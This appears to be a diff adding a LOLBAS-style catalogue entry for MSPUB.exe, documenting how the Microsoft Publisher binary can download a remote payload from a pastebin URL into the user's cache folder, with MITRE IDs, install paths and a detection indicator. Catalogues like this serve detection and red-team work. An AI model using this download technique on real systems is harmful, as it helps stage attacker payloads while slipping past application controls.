@@ -1,0 +1,37 @@
+---
+Name: MSPUB.exe
+Description: Microsoft Office binary
+Author: 'Nir Chako (Pentera)'
+Created: 2022-08-02
+Commands:
+  - Command: MSPUB.exe https://pastebin.com/raw/pnccaQCE
+    Description: Downloads payload from remote server
+    Usecase: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
+    Category: Download
+    Privileges: User
+    MitreID: T1105, T1218
+    OperatingSystem: Windows
+Full_Path:
+
+  - Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office\Office16\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office15\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office\Office15\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSPUB.exe
+  - Path: C:\Program Files (x86)\Microsoft Office\Office14\MSPUB.exe
+  - Path: C:\Program Files\Microsoft Office\Office14\MSPUB.exe
+Code_Sample:
+  - Code:
+Detection:
+  - IOC: Suspicious Office application Internet/network traffic
+Resources:
+
+Acknowledgement:
+  - Person: 'Nir Chako (Pentera)'
+    Handle: '@C_h4ck_0'
+---
